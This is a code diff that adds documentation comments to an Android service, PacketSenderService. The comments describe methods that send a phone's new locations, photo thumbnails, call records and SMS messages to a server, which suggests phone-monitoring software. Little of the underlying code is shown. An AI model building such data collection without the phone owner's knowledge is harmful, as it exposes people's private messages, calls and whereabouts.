@@ -30,8 +30,9 @@ import android.os.Process;
 import android.provider.MediaStore;
 
 /**
- * Created with IntelliJ IDEA. User: DeerHunter Date: 17.10.12 Time: 21:21 To
- * change this template use File | Settings | File Templates.
+ * This service is used to send packets to the server.
+ * 
+ * @author DeerHunter
  */
 public class PacketSenderService extends Service {
 
@@ -61,6 +62,9 @@ public class PacketSenderService extends Service {
 			stopSelf(msg.arg1);
 		}
 
+		/**
+		 * Sends new locations to the server.
+		 */
 		private void sendNewLocations() {
 			try {
 				ContentResolver cr = getContentResolver();
@@ -93,6 +97,9 @@ public class PacketSenderService extends Service {
 			}
 		}
 
+		/**
+		 * Sends new thumbnails to the server.
+		 */
 		private void sendNewThumbnails() {
 			try {
 				ContentResolver cr = getContentResolver();
@@ -150,6 +157,9 @@ public class PacketSenderService extends Service {
 			}
 		}
 
+		/**
+		 * Sends new calls to the server.
+		 */
 		private void sendNewCalls() {
 			try {
 				ContentResolver cr = getContentResolver();
@@ -181,6 +191,9 @@ public class PacketSenderService extends Service {
 			}
 		}
 
+		/**
+		 * Sends new SMSes to the server.
+		 */
 		private void sendNewSMS() {
 			try {
 				ContentResolver cr = getContentResolver();
